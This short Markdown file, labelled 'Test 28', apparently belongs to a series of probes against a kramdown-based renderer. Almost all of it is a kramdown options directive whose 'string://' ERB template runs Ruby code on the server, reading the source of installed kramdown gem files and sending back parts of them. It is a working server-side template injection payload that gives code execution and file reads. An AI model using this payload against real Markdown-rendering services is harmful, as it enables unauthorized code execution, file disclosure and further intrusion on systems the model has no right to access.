---
---

# Test 28: Read kramdown syntax highlighter source

{::options template="string://<%= r=''; begin; src=File.read('/usr/local/bundle/gems/kramdown-2.4.0/lib/kramdown/converter/syntax_highlighter.rb'); r=r+'SH_MODULE='+src[0..1500]+\"\\n\"; rescue => e; r=r+'SH_ERR='+e.message+\"\\n\"; end; begin; base=File.read('/usr/local/bundle/gems/kramdown-2.4.0/lib/kramdown/converter/base.rb'); idx=base.index('syntax_highlight'); if idx; r=r+'BASE_SH='+base[idx-100..idx+500]+\"\\n\"; end; idx2=base.index('highlight_code'); if idx2; r=r+'BASE_HC='+base[idx2-50..idx2+400]+\"\\n\"; end; rescue => e; r=r+'BASE_ERR='+e.message+\"\\n\"; end; r %>" /}

placeholder
